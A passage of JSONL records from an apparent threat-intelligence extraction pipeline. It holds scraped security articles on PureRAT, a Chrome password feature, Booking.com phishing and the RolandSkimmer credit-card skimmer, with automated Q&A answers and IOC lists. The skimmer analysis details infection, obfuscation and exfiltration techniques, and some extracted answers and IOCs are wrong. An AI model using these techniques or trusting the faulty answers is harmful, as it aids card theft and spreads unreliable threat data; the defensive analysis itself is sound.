details about the antivirus products installed, the computer name, and the time elapsed since the system startup. In response, the C2 server sends auxiliary modules to perform a variety of malicious actions -\n\n- PluginPcOption, which is capable of executing commands for self-deletion, restarting the executable file, and shutting down or rebooting the computer\n- PluginWindowNotify, which checks the name of the active window for keywords like password, bank, WhatsApp, and perform appropriate follow-up actions like unauthorized fund transfers\n- PluginClipper, which functions as a clipper malware by substituting cryptocurrency wallet addresses copied to the system's clipboard with an attacker-controlled one\n\n\"The Trojan includes modules for downloading and running arbitrary files that provide full access to the file system, registry, processes, camera and microphone, implement keylogger functionality, and give attackers the ability to secretly control the computer using the remote desktop principle,\" Kaspersky said.\n\nThe original executable that launches \"ckcfb.exe\" simultaneously also extracts a second binary referred to as \"StilKrip.exe,\" which is a commercially available downloader dubbed PureCrypter that has been used to deliver various payloads in the past. It's active since 2022.\n\n\"StilKrip.exe\" is designed to download \"Bghwwhmlr.wav,\" which follows the aforementioned attack sequence to run \"InstallUtil.exe\" and ultimately launch \"Ttcxxewxtly.exe,\" an executable that unpacks and runs a DLL payload called PureLogs (\"Bftvbho.dll\").\n\nPureLogs is an off-the-shelf information stealer that can harvest data from web browsers, email clients, VPN services, messaging apps, wallet browser extensions, password managers, cryptocurrency wallet apps, and other programs like FileZilla and WinSCP.\n\n\"The PureRAT backdoor and PureLogs stealer have broad functionality that allows attackers to gain unlimited access to infected systems and confidential organization data,\" Kaspersky said. \"The main vector of attacks on businesses has been and remains emails with malicious attachments or links.\"\n\nFound this article interesting?  Follow us on  and  to read more exclusive content we post.\n\nTrending News\n\n⚡ Weekly Recap: Zero-Day Exploits, Insider Threats, APT Targeting, Botnets and More\n\nResearchers Expose New Intel CPU Flaws Enabling Memory Leaks and Spectre v2 Attacks\n\nCoinbase Agents Bribed, Data of ~1% Users Leaked; $20M Extortion Attempt Fails\n\n5 BCDR Essentials for Effective Ransomware Defense\n\nNew Chrome Vulnerability Enables Cross-Origin Data Leak via Loader Referrer Policy\n\nLearning How to Hack: Why Offensive Security Training Benefits Your Entire Security Team\n\nFortinet Patches CVE-2025-32756 Zero-Day RCE Flaw Exploited in FortiVoice Systems\n\nMicrosoft Fixes 78 Flaws, 5 Zero-Days Exploited; CVSS 10 Bug Impacts Azure DevOps Server\n\nMalicious npm Package Leverages Unicode Steganography, Google Calendar as C2 Dropper\n\nMalicious PyPI Package Posing as Solana Tool Stole Source Code in 761 Downloads\n\nChina-Linked APTs Exploit SAP CVE-2025-31324 to Breach 581 Critical Systems Worldwide\n\nSecurity Tools Alone Don't Protect You — Control Effectiveness Does\n\nReevaluating SSEs: A Technical Gap Analysis of Last-Mile Protection\n\nPopular Resources\n\nGet This Free Pre-Built Workflow to Instantly Automate CVE Alerts\n\nSecure Google Workspace Access with Intelligent, AI-Driven Protection\n\nFree Guide: Master the Essentials of Machine Identity Management\n\nWorried About Identity Theft? 6 Simple Steps to Secure Microsoft Entra ID\n\n## Cybersecurity Webinars\n\n### Learn How Hackers Are Targeting Hidden AI Identity Accounts\n\nAI boosts speed and scale—but also risk. Hidden identity accounts can expose your systems if left unsecured.\n\n### Learn to Build a Reasonable Cyber Defense Program\n\nLearn how to build a compliant, defensible cybersecurity program using CIS Controls, CSAT Pro, and SecureSuite — all in one practical, expert-led session.\n\nLatest News\n\nCybersecurity Resources\n\n[Download] SaaS Security Guide That Turns Blind Spots Into Defenses\n\nA clear, practical guide to help CISOs and IT teams secure SaaS apps, reduce risks, and protect data.\n\nUnite Dev and Sec with ASPM\n\nRedefining Secure Development with Application Security Posture Management (ASPM). Unlock the tools and processes that will help developers ship fast and fix fast.\n\nDiscover How to Make CTEM a Reality in 2025: Download Your Guide Now!\n\nEnsure CTEM success! Download our ebook for practical tips on using XM Cyber to implement your exposure management strategy.\n\nWant To Excel as a Cybersecurity Professional?\n\nDevelop cybersecurity strategies that increase security with Georgetown.\n\n## JPMorgan CISO Spotlights SaaS Security Concerns. What Now?\n\n## Cover Your SaaS: Why SaaS Data Protection is the Foundation of Modern Business\n\n## Living Off the Land: What We Learned from 700,000 Security Incidents\n\n## Breach Fatalism is Over: Why Identity Threat Prevention Is the Future of Cybersecurity\n\nGet Latest News in Your Inbox\n\nGet the latest news, expert insights, exclusive resources, and strategies from industry leaders – all for free.\n\nConnect with us!\n\n925,500 Followers\n\n636,000 Followers\n\n23,500 Subscribers\n\n145,000 Followers\n\n1,890,500 Followers\n\n147,200 Subscribers\n\nCompany\n\n- About THN\n- Advertise with us\n- Contact\n\nPages\n\n- Webinars\n- Privacy Policy\n\nRSS Feeds\n\nContact Us\n\n© The Hacker News, 2025. All Rights Reserved."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/google-chrome-can-now-auto-change.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "The article mentions potential takeover attacks, as well as exploits such as zero-day exploits, Spectre v2 attacks, and ransomware attacks.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://thehackernews.com/2025/05/google-chrome-can-now-auto-change.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://www.thehackernews.com/"}], "keywords_found": ["analysis", "threat", "apt", "malicious", "passwords", "botnet", "dropper", "browser"], "article_textual_content": "# Google Chrome Can Now Auto-Change Compromised Passwords Using Its Built-In Manager\n\nGoogle has announced a new feature in its Chrome browser that lets its built-in Password Manager automatically change a user's password when it detects the credentials to be compromised.\n\n\"When Chrome detects a compromised password during sign in, Google Password Manager prompts the user with an option to fix it automatically,\" Google's Ashima Arora, Chirag Desai, and Eiji Kitamura said. \"On supported websites, Chrome can generate a strong replacement and update the password for the user automatically.\"\n\nThe feature builds upon Password Manager's existing capabilities to generate strong passwords during sign-up and flag credentials that have been detected in a data breach.\n\nWith the automated password change, Google said the idea is to reduce friction and help users keep their accounts secure without having to search for relevant account settings or abandon the process midway.\n\nWebsite owners can support this feature by adopting the following methods -\n\n- Use autocomplete=\"current-password\" and autocomplete=\"new-password\" to trigger autofill and storage\n- Set up a redirect from &lt;your-website-domain&gt;/.well-known/change-password to the password change form on their website\n\n\"It would be much easier if password managers could navigate the user directly to the change-password URL,\" Kitamura said. \"This is where a well-known URL for changing passwords becomes useful.\"\n\n\"By reserving a well-known URL path that redirects the user to the change password page, the website can easily redirect users to the right place to change their passwords.\"\n\nThe development comes as companies are increasingly shifting to passkeys as a stronger alternative to protect accounts from potential takeover attacks. Earlier this month, Microsoft said it's making passkeys the default method when signing up for new customer accounts.\n\nFound this article interesting?  Follow us on  and  to read more exclusive content we post.\n\nTrending News\n\n⚡ Weekly Recap: Zero-Day Exploits, Insider Threats, APT Targeting, Botnets and More\n\nResearchers Expose New Intel CPU Flaws Enabling Memory Leaks and Spectre v2 Attacks\n\nCoinbase Agents Bribed, Data of ~1% Users Leaked; $20M Extortion Attempt Fails\n\n5 BCDR Essentials for Effective Ransomware Defense\n\nNew Chrome Vulnerability Enables Cross-Origin Data Leak via Loader Referrer Policy\n\nLearning How to Hack: Why Offensive Security Training Benefits Your Entire Security Team\n\nFortinet Patches CVE-2025-32756 Zero-Day RCE Flaw Exploited in FortiVoice Systems\n\nMicrosoft Fixes 78 Flaws, 5 Zero-Days Exploited; CVSS 10 Bug Impacts Azure DevOps Server\n\nMalicious npm Package Leverages Unicode Steganography, Google Calendar as C2 Dropper\n\nMalicious PyPI Package Posing as Solana Tool Stole Source Code in 761 Downloads\n\nChina-Linked APTs Exploit SAP CVE-2025-31324 to Breach 581 Critical Systems Worldwide\n\nSecurity Tools Alone Don't Protect You — Control Effectiveness Does\n\nReevaluating SSEs: A Technical Gap Analysis of Last-Mile Protection\n\nPopular Resources\n\nGet This Free Pre-Built Workflow to Instantly Automate CVE Alerts\n\nSecure Google Workspace Access with Intelligent, AI-Driven Protection\n\nFree Guide: Master the Essentials of Machine Identity Management\n\nWorried About Identity Theft? 6 Simple Steps to Secure Microsoft Entra ID\n\n## Cybersecurity Webinars\n\n### Learn How Hackers Are Targeting Hidden AI Identity Accounts\n\nAI boosts speed and scale—but also risk. Hidden identity accounts can expose your systems if left unsecured.\n\n### Learn to Build a Reasonable Cyber Defense Program\n\nLearn how to build a compliant, defensible cybersecurity program using CIS Controls, CSAT Pro, and SecureSuite — all in one practical, expert-led session.\n\nLatest News\n\nCybersecurity Resources\n\n[Download] SaaS Security Guide That Turns Blind Spots Into Defenses\n\nA clear, practical guide to help CISOs and IT teams secure SaaS apps, reduce risks, and protect data.\n\nUnite Dev and Sec with ASPM\n\nRedefining Secure Development with Application Security Posture Management (ASPM). Unlock the tools and processes that will help developers ship fast and fix fast.\n\nDiscover How to Make CTEM a Reality in 2025: Download Your Guide Now!\n\nEnsure CTEM success! Download our ebook for practical tips on using XM Cyber to implement your exposure management strategy.\n\nWant To Excel as a Cybersecurity Professional?\n\nDevelop cybersecurity strategies that increase security with Georgetown.\n\n## JPMorgan CISO Spotlights SaaS Security Concerns. What Now?\n\n## Cover Your SaaS: Why SaaS Data Protection is the Foundation of Modern Business\n\n## Living Off the Land: What We Learned from 700,000 Security Incidents\n\n## Breach Fatalism is Over: Why Identity Threat Prevention Is the Future of Cybersecurity\n\nGet Latest News in Your Inbox\n\nGet the latest news, expert insights, exclusive resources, and strategies from industry leaders – all for free.\n\nConnect with us!\n\n925,500 Followers\n\n636,000 Followers\n\n23,500 Subscribers\n\n145,000 Followers\n\n1,890,500 Followers\n\n147,200 Subscribers\n\nCompany\n\n- About THN\n- Advertise with us\n- Contact\n\nPages\n\n- Webinars\n- Privacy Policy\n\nRSS Feeds\n\nContact Us\n\n© The Hacker News, 2025. All Rights Reserved."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://medium.com/@claudiovolpecv710/performing-static-malware-analysis-on-a-sample-malware-dc3b5f19a818?source=rss------malware-5", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://medium.com/@claudiovolpecv710/performing-static-malware-analysis-on-a-sample-malware-dc3b5f19a818?source=rss------malware-5", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "c2server.evil"}], "keywords_found": ["analysis", "malicious"], "article_textual_content": "# Performing Static Malware Analysis On A Sample Malware\n\n16 hours ago\n\n--\n\nShare\n\nHey beginners if you’re looking to get into malware analysis and wondering where to start this could be one of your initial baby step. So halt your reins, stop wandering, relax and just dive into it.\n\nLearn as much as you can because in this article I will be sharing the steps to analyze a simple piece of malware using static analysis and also show the tools that are used for this purpose. So be on your toes and keep your antennas up for any new jargon or terminology that flies your way.\n\nThis is a basic article for beginners but everyone is welcome to read along, maybe you’ll get something out of it. So, let’s hop onto it beginner bees you have tons of work to do.\n\n# Let’s Begin!!!\n\nLet’s start by understanding what basically malware analysis is. Malware analysis involves examining and understanding malicious software (mal-ware as the name suggests) , to comprehend its functionality, behavior, and impact on computer systems or networks. This process aims to dissect and study the code, structure, and activities of the malware to identify its intent, methods of operation, and potential risks.\n\n## Types Of Malware Analysis\n\nThere are several types of malware analysis:\n\n- Static Analysis…\n\n--\n\n--\n\n## Written by ClaudioXXX\n\n## No responses yet\n\nHelp\n\nStatus\n\nAbout\n\nCareers\n\nPress\n\nBlog\n\nPrivacy\n\nRules\n\nTerms\n\nText to speech"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://devsecopsai.today/inside-the-booking-com-phishing-scam-targeting-hotels-5a99d866a362?source=rss------malware-5", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware is information-stealing malware, which is installed silently to extract login credentials, potentially even financial or booking system data.", "question": "What kind of malware is it?"}, {"answer": "It involves a phishing campaign that uses a fake CAPTCHA and a convincing email to infiltrate hotel systems, steal data, and compromise guest privacy.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The attackers aim to extract login credentials, potentially even financial or booking system data, through information-stealing malware installed after the fake CAPTCHA is completed.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The phishing campaign aims to steal login credentials for hotel systems, and possibly payment information from booking systems, which could include credit card data.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The attack is related to information-stealing malware, which can extract login credentials, financial, or booking system data, but it is not specifically referred to as a \"wallet stealer\".", "question": "Is it related to wallet stealer?"}, {"answer": "The malware steals information such as login credentials, financial data, and booking system data.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://devsecopsai.today/inside-the-booking-com-phishing-scam-targeting-hotels-5a99d866a362?source=rss------malware-5", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": ["threat", "fraud", "apt", "phishing", "cybercrime", "malicious", "passwords", "dropper", "browser", "transaction"], "article_textual_content": "# Inside the Booking.com Phishing Scam Targeting Hotels\n\nJust now\n\n--\n\nListen\n\nShare\n\nImagine this: It’s a busy Friday afternoon at a boutique hotel. The front desk manager is juggling calls, check-ins and last-minute booking requests. An email pops in — a Booking.com confirmation with all the right details. Nothing unusual. Just another guest, just another click.\nExcept… this one opens the door to something far more dangerous than a room without a view.\n\nWelcome to the newest front in cybercrime: where trusted names are hijacked, and everyday tasks become gateways for malware. A recent phishing campaign has taken aim at the hospitality industry, using Booking.com as bait to infiltrate hotel systems, steal data, and compromise guest privacy — all with just a fake CAPTCHA and a convincing email.\n\n# Anatomy of the Attack\n\n## Booking Confirmations That Aren’t\n\nThe attack starts with an email that looks like it’s from Booking.com. These emails contain realistic details like:\n\n- Guest names\n- Stay dates\n- Booking reference numbers\n\nThe level of accuracy here isn’t accidental — the attackers use leaked or scraped booking data to make the email appear genuine. It blends right into a busy hotel inbox.\n\n## The Fake CAPTCHA Trick\n\nEmbedded in the email is a link — ostensibly to verify booking info or confirm guest preferences. This link leads to a fake Booking.com page, which presents a CAPTCHA challenge. But this isn’t about checking if you are human — the CAPTCHA is a decoy.\n\n## Malware Dropper via CAPTCHA\n\nOnce the CAPTCHA is completed, malicious code is executed in the background. Based on what’s confirmed in both reports:\n\n- Information-stealing malware is installed silently.\n- The goal is to extract login credentials, potentially even financial or booking system data.\n\nThe malware is downloaded and activated through a JavaScript execution after CAPTCHA submission. This method avoids raising red flags for most users — making the compromise nearly invisible.\n\nFake Booking.com email [Source: Malwarebytes]\n\n# Urgency as a Weapon\n\nThe campaign uses psychological levers to increase its hit rate:\n\n- Immediate Check-In Dates: Emails mention that a guest is checking in “tomorrow,” compelling staff to act fast.\n- Fear of Losing Business: Hotel personnel are conditioned to prioritize bookings, making them more likely to click links without full verification.\n\nFake CAPTCHA [Source:Malwarebytes]\n\n# Who’s Being Targeted and Why?\n\n## Primary Targets: Hotel Front Desks\n\nThe attackers are aiming squarely at hotel staff who:\n\n- Handle online bookings\n- Regularly open emails with attachments and links\n- May not have advanced cybersecurity training\n\n## What They’re After: Data is Gold\n\nThe goal? Data — specifically:\n\n- Login credentials for hotel systems\n- Possibly payment information from booking systems\n\nWith this access, attackers can harvest guest data or sell it, use it for fraud or launch further attacks on other businesses and individuals.\n\n# Why It’s More Than Just a Scam\n\n## For Hotels: More Than Just a Breach\n\nIf successful, the attack can:\n\n- Compromise reservation systems\n- Damage reputation and trust\n- Trigger data protection violations\n\nHotels risk both financial loss and long-term damage to their brand if guest data is mishandled.\n\n## For Guests: Privacy at Risk\n\nEven though guests aren’t directly targeted, they become collateral damage. If their booking data is stolen, it could be used for:\n\n- Identity theft\n- Phishing emails impersonating the hotel\n- Credit card fraud\n\n# Defending Against the Threat\n\n- Email Verification: Always verify the sender’s email domain and inspect headers.\n- Safe Browsing: Avoid clicking on unfamiliar links — especially those outside the verified Booking.com domain.\n- Browser Hygiene: Keep systems and browsers updated to avoid exploiting known vulnerabilities.\n\n## Staff Training &amp; Reporting\n\nHuman error is often the weakest link.\n\n- Train staff to recognize phishing signs: urgency, typos, suspicious links.\n- Implement protocols for reporting unusual emails.\n- Use a verification checklist for any unusual Booking.com communication.\n\n## For Users\n\n- Avoid Saving Card Info: Do not store payment data unnecessarily on booking platforms.\n- Use Strong Passwords: Always opt for unique and complex credentials.\n- Monitor Statements: Watch for unexpected transactions.\n\nThis scam isn’t about breaking systems — it’s about exploiting trust. By imitating Booking.com, attackers are turning hotels into targets and guests into victims. But awareness is your firewall.\n\nStick to verified links. Question urgency. Train your team.\n\n## Stay One Step Ahead of Cybercriminals!\n\n🔹 The best defense is staying informed and proactive!\n\n🔹 Follow me for more insights on the latest cyber threats, attack trends and security best practices.\n\n🔗 Let’s connect and fortify our digital world together!\n\nBooking Scams\n\nMalware\n\nPhishing\n\nHotel Security\n\nCybersecurity\n\n--\n\n--\n\n## Written by Deven Chhajed\n\n## No responses yet\n\nHelp\n\nStatus\n\nAbout\n\nCareers\n\nPress\n\nBlog\n\nPrivacy\n\nRules\n\nTerms\n\nText to speech"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/how-to-detect-phishing-attacks-faster.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically using malicious browser extensions across Chrome, Edge, and Firefox.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer malware steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information, but it is not specifically referred to as a wallet stealer in the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server with specific parameters in the URL, including the site, data, and credit card number.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria, but specific bank names, regions, or wallets are not mentioned in the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is the \"RolandSkimmer\" malware, a sophisticated credit card skimming campaign that targets users in Bulgaria. The attackers use a combination of techniques, including malicious browser extensions, obfuscated scripts, and deceptive LNK files, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, particularly those using Chrome, Edge, and Firefox browsers. The potential impact of this malware is high, as it can collect sensitive financial data, including credit card information, and exfiltrate it to the attacker's server, resulting in financial loss and identity theft for the victims.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["bank", "banking trojan", "malicious", "analysis", "phishing", "threat", "apt", "botnet", "browser", "intelligence"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla 